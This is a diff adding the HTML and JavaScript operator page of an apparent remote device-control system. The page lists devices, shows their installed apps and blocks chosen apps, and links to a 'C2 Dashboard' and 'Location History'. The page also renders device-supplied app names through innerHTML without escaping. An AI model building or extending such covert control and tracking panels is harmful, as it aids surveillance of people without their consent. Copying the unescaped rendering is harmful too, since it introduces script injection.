@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anasio | App Blocker</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
+    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
+        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200 gap-4">
+            <div class="flex items-center gap-4">
+                <div class="bg-purple-600 text-white p-2 rounded-lg">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                </div>
+                <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">App Execution Blocker</h1></div>
+            </div>
+            <div class="flex flex-wrap justify-center items-center gap-4">
+                <a href="/errors_view" class="text-xs font-bold text-red-500 hover:text-red-700 transition tracking-wide uppercase">Diagnostics</a>
+                <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
+                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
+                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
+                    <option value="">Loading...</option>
+                </select>
+            </div>
+        </nav>
+
+        <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+            <div class="flex items-center justify-between mb-6">
+                <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Installed Applications</p>
+                <button type="button" id="refresh-apps-btn" class="text-xs font-semibold px-4 py-2 rounded-xl bg-purple-100 text-purple-700 hover:bg-purple-200 transition">Request Device Scan</button>
+            </div>
+            <div id="apps-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                <div class="col-span-full text-center text-gray-400 py-8">Waiting for data...</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const selectEl = document.getElementById('device-select');
+        let currentInstalled = [];
+        let currentBlocked = [];
+
+        async function fetchAvailableDevices() {
+            try {
+                const res = await fetch('/devices');
+                const data = await res.json();
+                if (data.devices && data.devices.length > 0) {
+                    const val = selectEl.value;
+                    selectEl.innerHTML = '';
+                    data.devices.forEach(did => {
+                        const opt = document.createElement('option');
+                        opt.value = did; opt.textContent = did;
+                        selectEl.appendChild(opt);
+                    });
+                    if (val && data.devices.includes(val)) selectEl.value = val;
+                }
+            } catch(err) { console.error(err); }
+        }
+
+        async function fetchApps() {
+            if(!selectEl.value) return;
+            try {
+                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
+                if(res.ok) {
+                    const data = await res.json();
+                    
+                    const installedRaw = (data.installed_apps || "").trim();
+                    const blockedRaw = (data.blocked_apps || "").trim();
+                    
+                    const installedList = installedRaw ? installedRaw.split(',').map(a => a.trim()).filter(Boolean) : [];
+                    const blockedList = blockedRaw ? blockedRaw.split(',').map(a => a.trim()).filter(Boolean) : [];
+                    
+                    // Only re-render if data actually changed
+                    if(JSON.stringify(installedList) !== JSON.stringify(currentInstalled) || 
+                       JSON.stringify(blockedList) !== JSON.stringify(currentBlocked)) {
+                        
+                        currentInstalled = installedList;
+                        currentBlocked = blockedList;
+                        renderApps();
+                    }
+                }
+            } catch(e) { console.error(e); }
+        }
+
+        function renderApps() {
+            const container = document.getElementById('apps-container');
+            container.innerHTML = '';
+            
+            if (currentInstalled.length === 0) {
+                container.innerHTML = '<div class="col-span-full text-center text-gray-400 py-8">No app list available from device. Click Request Device Scan.</div>';
+                return;
+            }
+            
+            currentInstalled.sort().forEach(app => {
+                const isBlocked = currentBlocked.includes(app);
+                
+                const card = document.createElement('div');
+                card.className = `flex items-center justify-between p-4 rounded-xl border transition cursor-pointer ${isBlocked ? 'bg-red-50 border-red-200' : 'bg-gray-50 border-gray-200 hover:border-gray-300'}`;
+                
+                card.innerHTML = `
+                    <div class="flex flex-col overflow-hidden">
+                        <span class="text-sm font-semibold truncate ${isBlocked ? 'text-red-700' : 'text-gray-800'}">${app}</span>
+                        <span class="text-[10px] uppercase font-bold tracking-widest ${isBlocked ? 'text-red-500' : 'text-gray-400'}">${isBlocked ? 'BLOCKED' : 'ALLOWED'}</span>
+                    </div>
+                    <div class="ml-4 flex-shrink-0">
+                        <div class="w-10 h-6 rounded-full relative transition-colors ${isBlocked ? 'bg-red-500' : 'bg-gray-300'}">
+                            <div class="w-4 h-4 rounded-full bg-white absolute top-1 transition-transform ${isBlocked ? 'left-5' : 'left-1'}"></div>
+                        </div>
+                    </div>
+                `;
+                
+                card.addEventListener('click', () => toggleBlock(app, !isBlocked));
+                container.appendChild(card);
+            });
+        }
+
+        async function toggleBlock(app, block) {
+            let newBlocked = [...currentBlocked];
+            if (block && !newBlocked.includes(app)) {
+                newBlocked.push(app);
+            } else if (!block && newBlocked.includes(app)) {
+                newBlocked = newBlocked.filter(a => a !== app);
+            }
+            
+            // Optimistic UI update
+            currentBlocked = newBlocked;
+            renderApps();
+            
+            // Send to server
+            if(!selectEl.value) return;
+            const payload = {
+                device_id: selectEl.value,
+                apps: newBlocked.join(",")
+            };
+            try {
+                await fetch('/set_blocked_apps', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) {
+                console.error("Failed to update blocked apps", e);
+            }
+        }
+
+        async function requestDeviceScan() {
+            if(!selectEl.value) { alert('No device selected'); return; }
+            const btn = document.getElementById('refresh-apps-btn');
+            btn.textContent = "Requesting...";
+            btn.disabled = true;
+            
+            const fd = new FormData();
+            fd.append('device_id', selectEl.value);
+            try {
+                await fetch('/request_installed_apps', { method: 'POST', body: fd });
+            } catch(e) {}
+            
+            setTimeout(() => {
+                btn.textContent = "Request Device Scan";
+                btn.disabled = false;
+                fetchApps();
+            }, 3000);
+        }
+
+        document.getElementById('refresh-apps-btn').addEventListener('click', requestDeviceScan);
+        selectEl.addEventListener('change', fetchApps);
+        
+        (async () => { 
+            await fetchAvailableDevices(); 
+            fetchApps(); 
+            setInterval(fetchApps, 5000); 
+        })();
+    </script>
+</body>
+</html>
